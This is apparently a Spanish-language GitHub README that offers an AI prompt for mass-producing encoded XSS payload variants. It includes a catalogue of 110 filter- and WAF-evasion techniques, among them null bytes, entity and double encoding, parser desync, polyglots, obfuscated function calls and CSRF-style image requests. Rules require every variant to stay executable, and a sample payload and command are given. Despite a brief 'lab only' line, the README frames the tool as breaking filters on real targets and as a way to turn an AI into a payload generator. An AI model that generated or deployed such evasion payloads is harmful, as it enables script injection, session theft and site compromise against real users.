<h1 align="center"><img height="40" src="https://github.com/Aquiles369/iconos/blob/main/img/lobo1.gif"><img height="40" src="https://media4.giphy.com/media/v1.Y2lkPTc5MGI3NjExNWx4YTl1dW9scXlqZDk2cTdyY2VvcXQwMG40OGoxY25rZzV0MDZhcCZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9cw/peSyJWjNTRfzaWh49M/giphy.gif">"Promt de 100 tecnicas xss + ia"<img height="40" src="https://media4.giphy.com/media/v1.Y2lkPTc5MGI3NjExNWx4YTl1dW9scXlqZDk2cTdyY2VvcXQwMG40OGoxY25rZzV0MDZhcCZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9cw/peSyJWjNTRfzaWh49M/giphy.gif"><img height="40" src="https://github.com/Aquiles369/iconos/blob/main/img/lobo1.gif"></h1>	


<br>


<p align="center">
 <img  height="470rem" alt="GIF" src="https://media4.giphy.com/media/v1.Y2lkPTc5MGI3NjExM3FlMGMzZDU3Z29pemVvMzNwNDh2Z3p6M21nNHdtcHF4M2owMW5oNCZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9cw/uVTWbiAnVKEhM1nodr/giphy.gif"/>
</p>


<picture> <img src="https://user-images.githubusercontent.com/73097560/115834477-dbab4500-a447-11eb-908a-139a6edaec5c.gif">  </picture>

 ### <picture> <img src = "https://media4.giphy.com/media/v1.Y2lkPTc5MGI3NjExanFvYmR6eXpjMHNpNGlqcGtncndtOWdyeHQyM2Q2bWw5aWN1dXV3NSZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9cw/Ya34zNmLFEftuPlnsf/giphy.gif" width = 75px>  </picture> Promt de 100 tecnicas xss + ia
<br>

 **Prompt diseñado para generar automáticamente variantes codificadas de payloads XSS sin romper su ejecución ni estructura. Permite aplicar múltiples técnicas de encoding (de Base64 a UTF-32, ROT, MIME, escapes JS, entidades HTML, etc.) con control fino sobre qué partes transformar (caracteres especiales, todo el contenido o mezcla segmentada) y con validaciones estrictas para asegurar que las variantes sigan siendo funcionales en navegadores modernos.** 
<br><br> 

<p align="center">
 <img  height="420rem" alt="GIF" src="https://github.com/Aquiles369/iconos/blob/main/demo_codificacion.gif"/>
</p>

<br>
<picture> <img src="https://user-images.githubusercontent.com/74038190/212284115-f47cd8ff-2ffb-4b04-b5bf-4d1c14c0247f.gif" width ="1050" > </picture>
<br>

### <picture> <img src = "https://media1.giphy.com/media/v1.Y2lkPTc5MGI3NjExY2NvZjdjNGp1a25zZXQ3NWttbjQ1ZnBldjluNHhtaXpwa2cybGM1NCZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9cw/koWetPk6RbbQKPJvOf/giphy.gif" width = 75px>  </picture> Problema que resuelve<br><br>
**• En entornos reales, los WAF, filtros y sanitizadores detectan y bloquean payloads XSS conocidos. Este prompt resuelve ese obstáculo generando miles de variantes funcionales con diferentes codificaciones, capaces de evadir filtros sin alterar la ejecución del payload.** 

<br>

### <picture> <img src = "https://media0.giphy.com/media/v1.Y2lkPTc5MGI3NjExNXYyOHp5MGFrdG9laWhyOHJqNm8xa2E5ODZtZzR5eTFid3d2bGloOCZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9cw/XBopTZ9jTENu4RTncQ/giphy.gif" width = 75px>  </picture> Qué aporta y cómo beneficia <br><br>

• Automatiza la generación de variantes codificadas sin esfuerzo manual.<br>

• Multiplica la evasión: cada payload puede mutar en cientos o miles de formas distintas.<br>

• Refuerza la investigación: permite probar cómo cada codificación afecta detección y ejecución.<br>

• Ideal para laboratorio: perfecto para probar bypasses de WAF, CSP, parsers o sanitizadores en un entorno seguro.<br><br>



<picture> <img src="https://user-images.githubusercontent.com/74038190/212284115-f47cd8ff-2ffb-4b04-b5bf-4d1c14c0247f.gif" width ="1050" > </picture>
<br>

### <picture> <img src = "https://media4.giphy.com/media/v1.Y2lkPTc5MGI3NjExNTJka3RoZ25wZ2oycWd6YXU4NWk2MHl2OWFjejlpZGRhNG8zcXdtZiZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9cw/wcaG5uOyYwItg60qet/giphy.gif" width = 80px>  </picture> Resumen rápido
<br><br>

- “Una fábrica automática de variantes XSS codificadas que mantiene el payload funcional y rompe filtros como si fueran papel.”<br><br>
 
#1 — Promt de ia + codificación de payload.

 ```yaml
[INPUTS DEL USUARIO] payloads: A) un payload único, o B) lista (uno por línea). seed: entero opcional (para reproducibilidad). variants_per_payload: número de variantes por payload. x9_list: IDs de técnicas a aplicar (ej.: #1,#4,#12,#18,#25,#48). apply_mode: "simple" | "combo" | "chaos" simple: 1 técnica por variante. combo: mezcla 2–4 técnicas por variante. chaos: elige aleatoriamente entre todas por variante. combo_flags (opcional): #*, #**, #a modo_validación: "estricto" | "relajado" (por defecto: estricto)
[x9_tecnicas_xss — DISPONIBLES]
x9_tecnicas_xss: [OK] = vigente en navegadores modernos (apto para lab). [LEGACY] = funciona solo en navegadores muy antiguos (histórico/curiosidad). #1: Espacios en blanco extra dentro de la etiqueta <script > — [OK] #2: Caracteres de control en el tag (<script[\x09]>, [\x10], [\x13]) — [OK] #3: Byte nulo en el nombre de la etiqueta (<scr[\x00]ipt>) — [OK] #4: Engañar regex con atributo “trampa” y > en comillas (<script a=">">) — [OK] #5: Nombre de archivo señuelo en src para burlar filtros por extensión — [OK] #6: Uso de eventos atípicos (p. ej., onstart, onfinish) — [OK] #7: Etiquetas menos comunes como vector (<svg> y similares) — [OK] #8: Eventos en etiquetas “obvias” olvidadas (<body onload=...>) — [OK] #9: Delimitadores atípicos en atributos (", ', ) + inyección en src — [OK] #10: Comentarios/ángulos extra para romper parsers (<<script>...//<</script>) — [OK] #11: Ángulo < extra al final tolerado por navegadores (<iframe ... <) — [OK] #12: Reemplazar el primer espacio tras el nombre de la etiqueta por / (<img/onload=...>) — [OK] #13: Comillas desordenadas o sin cerrar (autocorrección del navegador) — [OK] #14: Inyección en value con comilla sin cerrar y cierre con > — [OK] #15: Basura después del nombre de la etiqueta (<script/anything>) — [OK] #16: Combinar métodos: meta refresh + data: + Base64 — [OK] #17: Identificar campos/sinks sin filtro y priorizarlos — [OK] #18: Evadir bloqueo de <script> usando etiquetas con eventos (<img onerror>, <svg onload>) — [OK] #19: Romper filtros case/keyword con mayúsculas mixtas y eventos alternativos — [OK] #20: Sustituir caracteres bloqueados con entidades/encodings (HTML, &lpar;, &rpar;, doble URL-encode) — [OK] #21: Cerrar comentarios HTML para salir del bloque e inyectar (--> ... <!--) — [OK] #22: Explotar restricciones por etiqueta con payloads específicos (<iframe src=javascript:...>, <svg onload=...>) — [OK] #23: Abusar de decodificación del servidor (p. ej., html_entity_decode) para reconstruir tokens — [OK] #24: Reemplazar espacios por / o + en el primer delimitador — [OK] #25: Break de atributo con '"> e inyección de nueva etiqueta — [OK] #26: Bypass de uppercasing con entidades numéricas (&97;&108;...) — [OK] #27: Disparadores no obvios: onscroll + autofocus para provocar scroll — [OK] #28: Template literals / backticks en JS (...${...}) y cierres </Script> mixtos — [OK] #29: Doble codificación de entidad para > (&%2362; → &#62; → >) — [OK] #30: Aprovechar WAF que decodifica una sola vez (segunda decodificación en el navegador) — [OK] #31: Evento menos vigilado: usar onchange en lugar de onclick — [OK] #32: Disparo por cambio de estado con label+checkbox oculto — [OK] #33: Obfuscación de función con brackets+array (top[['alert'][0]](...)) — [OK] #34: Evasión de firmas mediante acceso alternativo a propiedades (sin .alert) — [OK] #35: Sustituir document.domain por location.hostname — [OK] #36: Superficie de click forzada (position:fixed; inset:0 en <label>) — [OK] #37: Elemento de interacción invisible (display:none en checkbox) — [OK] #38: Auto-limpieza del artefacto (this.remove()) — [OK] #39: Sin concatenación con comillas (evita reglas por "+"/'+) — [OK] #40: Sin invocación directa alert() (reduce heurísticas) — [OK] #41: Salir de <script> y meter comentario para reabrir contexto seguro — [OK] #42: Codificar onload= (p. ej., %3D) + usar coma/find para ocultar invocación — [OK] #43: Cerrar </script> con tag malformado para desincronizar parser — [OK] #44: Codificar paréntesis y especiales (%26rpar;, &lpar;, &#41;) — [OK] #45: Atributos señuelo masivos para romper regex y ocultar href real — [OK] #46: Acceso alternativo a función vía brackets/arrays ([1].find(...), top[...]) — [OK] #47: Carga de script externo directa (<script src=...>) — [OK] #48: Políglota multi-contexto (HTML/JS/URL) — [OK] #49: Etiqueta <a> malformada sin href con evento (onmouseover) — [OK] #50: IMG malformado que fuerza parseo laxo e inyecta <script> — [OK] #51: Reconstruir JS con fromCharCode / atob — [OK] #52: SRC por defecto (#, vacío u omitido) + evento — [OK] #53: onerror en IMG para ejecutar handler — [OK] #54: Entidades decimales/hex para javascript: / alert / paréntesis — [OK] #55: Entidades sin ; (padding 1–7 dígitos) — [OK] #56: Tabs/NL/CR incrustados en javascript: — [OK] #57: Byte nulo %00 en java\0script: — [OK] #58: Separadores ASCII 1–32 antes de javascript: — [OK] #59: Tag split con / (<SCRIPT/XSS ...>, <SCRIPT/SRC=...>) — [OK] #60: Carácter no alfanumérico entre evento y = (tolerancia Gecko) — [OK] #61: SCRIPT sin </script> (autocierre por HTML siguiente) — [OK] #62: SRC protocol-relative //host/.j (resolución de protocolo) — [OK] #63: Vector “medio abierto” dependiente de HTML debajo (sin >) — [OK] #64: Escapar el escape en JS embebido (\";alert(1);//) — [OK] #65: Cerrar </script> y abrir otro <script> — [OK] #66: Cerrar </title> y abrir <script> — [OK] #67: <svg/onload=...> (evento de carga) — [OK] #68: <body onload/onscroll/...> como vector global — [OK] #69: Catálogo amplio de eventos (copy/paste/drag/print/wheel, etc.) — [OK] #70: formaction=javascript: en <button>/<input type=submit> — [OK] #71: href=javascript: con obfuscación (tabs/NL/entidades) — [OK] #72: URL con IP/hex/octal/DWORD para evadir listas por host — [OK] #73: Mezcla de codificaciones (base64 + tabs/NL entre comillas) — [OK] #74: Omisión de esquema (//example) y CNAME stripping — [OK] #75: javascript: vía reemplazo/transformación de contenido — [OK] #76: HTTP Parameter Pollution para promover JS ejecutable — [OK] #77: Variantes escapadas de < (HTML/JS/URL) para reconstruir — [OK] #78: XSS almacenado (ejecución en render) — [OK] #79: Reflected-in-JS (inyectar en setTimeout(...) etc.) — [OK] #80: DOM-XSS (sinks eval, innerHTML, etc.) — [OK] #81: Redirección a data: base64 para cargar HTML ejecutable — [OK] #82: data:/javascript: en iframe/src — [OK] #83: video/source onerror / img onerror con eval(src) o brackets — [OK] #84: meta refresh → javascript: — [OK] #85: meta refresh → data:text/html;base64,... — [OK] #86: svg <script xlink:href=data:,...> — [OK] #87: Unicode escapes en función (p. ej., \u0061lert) en javascript: — [OK] #88: Ofuscación de alert (brackets, regex .source, \u, .toString(30), optional chaining) — [OK] #89: Backticks envolventes en sinks que lo requieren ( ${alert} `) — [OK] #90: Cerrar comentario HTML en mitad de palabra (javas<!-- -->cript) — [OK] #91: meta http-equiv=Set-Cookie con JS embebido — [OK] #92: embed data:image/svg+xml;base64,... con <script> (Fx-only) — [OK] #93: IMG “comandos administrativos” (CSRF-like) bajo sesión — [OK] #94: 302/304 redirect de imagen hacia acción peligrosa — [OK] #95: Bypass de resolución de protocolo en WAF (evitar http(s)://) — [OK] #96: document.write("<SCRI");</SCRIPT>PT ... para dividir firmas — [OK] #97: Atributos hoy no ejecutables (background="javascript:...", dynsrc, lowsrc) — [LEGACY] #98: <link rel=stylesheet href="javascript:..."> — [LEGACY] #99: CSS background:url(javascript:...) — [LEGACY] #100: CSS expression() / xss:expression(...) — [LEGACY] #101: style @import 'javascript:...' — [LEGACY] #102: -moz-binding:url(...#xss) (XUL binding) — [LEGACY] #103: HTML condicional IE (<!--[if gte IE 4]> ...) — [LEGACY] #104: US-ASCII malformado (7-bit) para <script> — [LEGACY] #105: Islas de datos XML + SPAN DATASRC — [LEGACY] #106: HTML+TIME (t:set / #default#time2) — [LEGACY] #107: BASE HREF="javascript:..." con comentario — [LEGACY] #108: SSI <!--#exec ... --> para inyectar — [LEGACY] #109: PHP echo concatenado para emitir <script> — [LEGACY] #110: object/data="javascript:..." / applet code=javascript:... — [LEGACY] #: Cada payload cambia el orden de sus piezas internas (etiqueta, evento, atributos) dinámicamente Inyecta instrucciones autodestructivas (que se eliminan tras ejecutar) Usa reensamblado fragmentado (split + join, concat, null bytes, comentarios aleatorios) Añade reordenamiento aleatorio en cada generación, así que ni siquiera dos ejecuciones iguales generan el mismo payload #*: repetir última técnica usada #**: aplicar solo en caracteres normales (no especiales) #a: varias entre tecnicas generar entropia entre cada tecnias usada en cada paylodad xss #0: #00: #526+: 
#*: reutilizar última técnica usada #**: aplicar técnica solo a secciones no críticas #a: mezclar múltiples técnicas por payload #526+: orden aleatorio dinámico, fragmentación, autodestrucción [REGLAS DURAS] No romper sintaxis HTML/JS. Mantener balanceo de paréntesis, comillas y delimitadores. Preservar primitivas de ejecución (alert, onerror, etc.). Variar estructura según técnica sin introducir invisibles disruptivos. No alterar nombres críticos (etiquetas, eventos). Si una técnica rompe ejecución → descartar y regenerar (máx. 3 intentos). [VALIDACIÓN — modo estricto] ✅ A: Sintaxis intacta. ✅ B: Balanceo correcto. ✅ C: Primitiva ejecuta. ✅ D: Técnicas dentro de x9_list. ✅ E: Sin invisibles disruptivos. [FORMATO DE SALIDA — ESTRICTO] Solo la lista de payloads generados, uno por línea, sin títulos ni hashes. [POLÍTICA DE USO] Solo para laboratorio controlado. Partir SIEMPRE de payloads proporcionados por el usuario. No incluir dominios reales. 📦 Ejemplo de comando: payloads: <img src=x onerror=alert(1)> seed: 1337 variants_per_payload: 30 x9_list: #1,#4,#10,#12,#18,#25,#33,#48 apply_mode: combo combo_flags: #a,#** modo_validación: estricto

```
<br>

#2 — Cómo usar los flags y el alcance.

 ```yaml
#*: repetir última técnica usada

#**: aplicar solo en caracteres normales

#a: mezclar varias técnicas por payload

#526+: orden aleatorio dinámico, fragmentación, autodestrucción


## — Ejemplo de comando solo payload

 ```yaml
payloads:
  <img src=x onerror=alert(1)>
seed: 1337
variants_per_payload: 30
x9_list: #1,#4,#10,#12,#18,#25,#33,#48
apply_mode: combo
combo_flags: #a,#**
modo_validación: estricto

```


<br><br>

## 3 — Explicación del promt

INPUTS DEL USUARIO

 ```yaml
[INPUTS DEL USUARIO]

payloads:
A) un payload único
B) lista (uno por línea)

seed: entero opcional (para reproducibilidad)

variants_per_payload: número de variantes por payload

x9_list: IDs de técnicas a aplicar (ej.: #1,#4,#12,#18,#25,#48)

apply_mode: "simple" | "combo" | "chaos"

simple: 1 técnica por variante

combo: mezcla 2–4 técnicas por variante

chaos: elige aleatoriamente entre todas por variante

combo_flags (opcional): #*, #**, #a

modo_validación: "estricto" | "relajado" (por defecto: estricto)
```

<br>

#4 — Bloques de codificaciones disponibles 

 ```yaml
x9_tecnicas_xss:
    [OK] = vigente en navegadores modernos (apto para lab).
    [LEGACY] = funciona solo en navegadores muy antiguos (histórico/curiosidad).
	  #1: Espacios en blanco extra dentro de la etiqueta <script > — [OK]
	  #2: Caracteres de control en el tag (<script[\x09]>, [\x10], [\x13]) — [OK]
	  #3: Byte nulo en el nombre de la etiqueta (<scr[\x00]ipt>) — [OK]
	  #4: Engañar regex con atributo “trampa” y > en comillas (<script a=">">) — [OK]
	  #5: Nombre de archivo señuelo en src para burlar filtros por extensión — [OK]
	  #6: Uso de eventos atípicos (p. ej., onstart, onfinish) — [OK]
	  #7: Etiquetas menos comunes como vector (<svg> y similares) — [OK]
	  #8: Eventos en etiquetas “obvias” olvidadas (<body onload=...>) — [OK]
	  #9: Delimitadores atípicos en atributos (", ', `) + inyección en src — [OK]
	  #10: Comentarios/ángulos extra para romper parsers (<<script>...//<</script>) — [OK]
	  #11: Ángulo < extra al final tolerado por navegadores (<iframe ... <) — [OK]
	  #12: Reemplazar el primer espacio tras el nombre de la etiqueta por / (<img/onload=...>) — [OK]
	  #13: Comillas desordenadas o sin cerrar (autocorrección del navegador) — [OK]
	  #14: Inyección en value con comilla sin cerrar y cierre con > — [OK]
	  #15: Basura después del nombre de la etiqueta (<script/anything>) — [OK]
	  #16: Combinar métodos: meta refresh + data: + Base64 — [OK]
	  #17: Identificar campos/sinks sin filtro y priorizarlos — [OK]
	  #18: Evadir bloqueo de <script> usando etiquetas con eventos (<img onerror>, <svg onload>) — [OK]
	  #19: Romper filtros case/keyword con mayúsculas mixtas y eventos alternativos — [OK]
	  #20: Sustituir caracteres bloqueados con entidades/encodings (HTML, &lpar;, &rpar;, doble URL-encode) — [OK]
	  #21: Cerrar comentarios HTML para salir del bloque e inyectar (--> ... <!--) — [OK]
	  #22: Explotar restricciones por etiqueta con payloads específicos (<iframe src=javascript:...>, <svg onload=...>) — [OK]
	  #23: Abusar de decodificación del servidor (p. ej., html_entity_decode) para reconstruir tokens — [OK]
	  #24: Reemplazar espacios por / o + en el primer delimitador — [OK]
	  #25: Break de atributo con '"> e inyección de nueva etiqueta — [OK]
	  #26: Bypass de uppercasing con entidades numéricas (&97;&108;...) — [OK]
	  #27: Disparadores no obvios: onscroll + autofocus para provocar scroll — [OK]
	  #28: Template literals / backticks en JS (`...${...}`) y cierres </Script> mixtos — [OK]
	  #29: Doble codificación de entidad para > (&%2362; → &#62; → >) — [OK]
	  #30: Aprovechar WAF que decodifica una sola vez (segunda decodificación en el navegador) — [OK]
	  #31: Evento menos vigilado: usar onchange en lugar de onclick — [OK]
	  #32: Disparo por cambio de estado con label+checkbox oculto — [OK]
	  #33: Obfuscación de función con brackets+array (top[['alert'][0]](...)) — [OK]
	  #34: Evasión de firmas mediante acceso alternativo a propiedades (sin .alert) — [OK]
	  #35: Sustituir document.domain por location.hostname — [OK]
	  #36: Superficie de click forzada (position:fixed; inset:0 en <label>) — [OK]
	  #37: Elemento de interacción invisible (display:none en checkbox) — [OK]
	  #38: Auto-limpieza del artefacto (this.remove()) — [OK]
	  #39: Sin concatenación con comillas (evita reglas por "+"/'+) — [OK]
	  #40: Sin invocación directa alert() (reduce heurísticas) — [OK]
	  #41: Salir de <script> y meter comentario para reabrir contexto seguro — [OK]
	  #42: Codificar onload= (p. ej., %3D) + usar coma/find para ocultar invocación — [OK]
	  #43: Cerrar </script> con tag malformado para desincronizar parser — [OK]
	  #44: Codificar paréntesis y especiales (%26rpar;, &lpar;, &#41;) — [OK]
	  #45: Atributos señuelo masivos para romper regex y ocultar href real — [OK]
	  #46: Acceso alternativo a función vía brackets/arrays ([1].find(...), top[...]) — [OK]
	  #47: Carga de script externo directa (<script src=...>) — [OK]
	  #48: Políglota multi-contexto (HTML/JS/URL) — [OK]
	  #49: Etiqueta <a> malformada sin href con evento (onmouseover) — [OK]
	  #50: IMG malformado que fuerza parseo laxo e inyecta <script> — [OK]
	  #51: Reconstruir JS con fromCharCode / atob — [OK]
	  #52: SRC por defecto (#, vacío u omitido) + evento — [OK]
	  #53: onerror en IMG para ejecutar handler — [OK]
	  #54: Entidades decimales/hex para javascript: / alert / paréntesis — [OK]
	  #55: Entidades sin ; (padding 1–7 dígitos) — [OK]
	  #56: Tabs/NL/CR incrustados en javascript: — [OK]
	  #57: Byte nulo %00 en java\0script: — [OK]
	  #58: Separadores ASCII 1–32 antes de javascript: — [OK]
	  #59: Tag split con / (<SCRIPT/XSS ...>, <SCRIPT/SRC=...>) — [OK]
	  #60: Carácter no alfanumérico entre evento y = (tolerancia Gecko) — [OK]
	  #61: SCRIPT sin </script> (autocierre por HTML siguiente) — [OK]
	  #62: SRC protocol-relative //host/.j (resolución de protocolo) — [OK]
	  #63: Vector “medio abierto” dependiente de HTML debajo (sin >) — [OK]
	  #64: Escapar el escape en JS embebido (\";alert(1);//) — [OK]
	  #65: Cerrar </script> y abrir otro <script> — [OK]
	  #66: Cerrar </title> y abrir <script> — [OK]
	  #67: <svg/onload=...> (evento de carga) — [OK]
	  #68: <body onload/onscroll/...> como vector global — [OK]
	  #69: Catálogo amplio de eventos (copy/paste/drag/print/wheel, etc.) — [OK]
	  #70: formaction=javascript: en <button>/<input type=submit> — [OK]
	  #71: href=javascript: con obfuscación (tabs/NL/entidades) — [OK]
	  #72: URL con IP/hex/octal/DWORD para evadir listas por host — [OK]
	  #73: Mezcla de codificaciones (base64 + tabs/NL entre comillas) — [OK]
	  #74: Omisión de esquema (//example) y CNAME stripping — [OK]
	  #75: javascript: vía reemplazo/transformación de contenido — [OK]
	  #76: HTTP Parameter Pollution para promover JS ejecutable — [OK]
	  #77: Variantes escapadas de < (HTML/JS/URL) para reconstruir — [OK]
	  #78: XSS almacenado (ejecución en render) — [OK]
	  #79: Reflected-in-JS (inyectar en setTimeout(...) etc.) — [OK]
	  #80: DOM-XSS (sinks eval, innerHTML, etc.) — [OK]
	  #81: Redirección a data: base64 para cargar HTML ejecutable — [OK]
	  #82: data:/javascript: en iframe/src — [OK]
	  #83: video/source onerror / img onerror con eval(src) o brackets — [OK]
	  #84: meta refresh → javascript: — [OK]
	  #85: meta refresh → data:text/html;base64,... — [OK]
	  #86: svg <script xlink:href=data:,...> — [OK]
	  #87: Unicode escapes en función (p. ej., \u0061lert) en javascript: — [OK]
	  #88: Ofuscación de alert (brackets, regex .source, \u, .toString(30), optional chaining) — [OK]
	  #89: Backticks envolventes en sinks que lo requieren ( `${alert}` ``) — [OK]
	  #90: Cerrar comentario HTML en mitad de palabra (javas<!-- -->cript) — [OK]
	  #91: meta http-equiv=Set-Cookie con JS embebido — [OK]
	  #92: embed data:image/svg+xml;base64,... con <script> (Fx-only) — [OK]
	  #93: IMG “comandos administrativos” (CSRF-like) bajo sesión — [OK]
	  #94: 302/304 redirect de imagen hacia acción peligrosa — [OK]
	  #95: Bypass de resolución de protocolo en WAF (evitar http(s)://) — [OK]
	  #96: document.write("<SCRI");</SCRIPT>PT ... para dividir firmas — [OK]
	  #97: Atributos hoy no ejecutables (background="javascript:...", dynsrc, lowsrc) — [LEGACY]
	  #98: <link rel=stylesheet href="javascript:..."> — [LEGACY]
	  #99: CSS background:url(javascript:...) — [LEGACY]
	  #100: CSS expression() / xss:expression(...) — [LEGACY]
	  #101: style @import 'javascript:...' — [LEGACY]
	  #102: -moz-binding:url(...#xss) (XUL binding) — [LEGACY]
	  #103: HTML condicional IE (<!--[if gte IE 4]> ...) — [LEGACY]
	  #104: US-ASCII malformado (7-bit) para <script> — [LEGACY]
	  #105: Islas de datos XML + SPAN DATASRC — [LEGACY]
	  #106: HTML+TIME (t:set / #default#time2) — [LEGACY]
	  #107: BASE HREF="javascript:..." con comentario — [LEGACY]
	  #108: SSI <!--#exec ... --> para inyectar — [LEGACY]
	  #109: PHP echo concatenado para emitir <script> — [LEGACY]
	  #110: object/data="javascript:..." / applet code=javascript:... — [LEGACY]
          #: Cada payload cambia el orden de sus piezas internas (etiqueta, evento, atributos) dinámicamente Inyecta instrucciones autodestructivas (que se eliminan    tras ejecutar) Usa reensamblado fragmentado (split + join, concat, null bytes, comentarios aleatorios) Añade reordenamiento aleatorio en cada generación, así que ni siquiera dos ejecuciones iguales generan el mismo payload	
          #*: repetir última técnica usada
          #**: aplicar solo en caracteres normales (no especiales)
          #a: varias entre tecnicas generar entropia entre cada tecnias usada en cada paylodad xss
          #0:
          #00:
          #526+:
```

<br>

#5 — Reglas duras — Siempre debe cumplir 

 ```yaml
❌ No romper sintaxis HTML/JS.

⚖️ Mantener balanceo de paréntesis, comillas y delimitadores.

🧠 Preservar primitivas de ejecución (alert, onerror, etc.).

🧪 Variar estructura según técnica sin introducir invisibles disruptivos.

🏷️ No alterar nombres críticos (etiquetas, eventos).

🔁 Si una técnica rompe ejecución → descartar y regenerar (máx. 3 intentos).
```


<br>

#6 — Validación automatica (modo_validación="estricto")

 ```yaml
✅ A: Sintaxis intacta
✅ B: Balanceo correcto
✅ C: Primitiva ejecuta
✅ D: Técnicas dentro de x9_list
✅ E: Sin invisibles disruptivos
```

<br>

#7 — Formato de salida — impresión mínima.

 ```yaml
**Solo la lista de payloads resultantes**, uno por línea, sin títulos ni hashes ni descripciones.

```


<br>

#8 — Solicitar insumos

 ```yaml
1) ¿Payload único o lista?
2) variants_per_payload
3) seed (opcional)
4) x18_list (IDs)
5) apply_scope: special_only | all | mixed
6) combo_flags (opcional): #*, #**, #a
```




<picture> <img src="https://user-images.githubusercontent.com/74038190/212284115-f47cd8ff-2ffb-4b04-b5bf-4d1c14c0247f.gif" width ="1050" > </picture>
<br>

### <picture> <img src = "https://media4.giphy.com/media/v1.Y2lkPTc5MGI3NjExc3YwbG9zbmU1amprdTJsbmxzYnpobzd5eGtnazB6b2FmdnllaTRhZyZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9cw/h8UlsEpqiCISTKUzvz/giphy.gif" width = 80px>  </picture> “Codificá, mutá y evadí — tu payload nunca más será el mismo.”

<picture> <img src="https://user-images.githubusercontent.com/74038190/212284115-f47cd8ff-2ffb-4b04-b5bf-4d1c14c0247f.gif" width ="1050" > </picture>
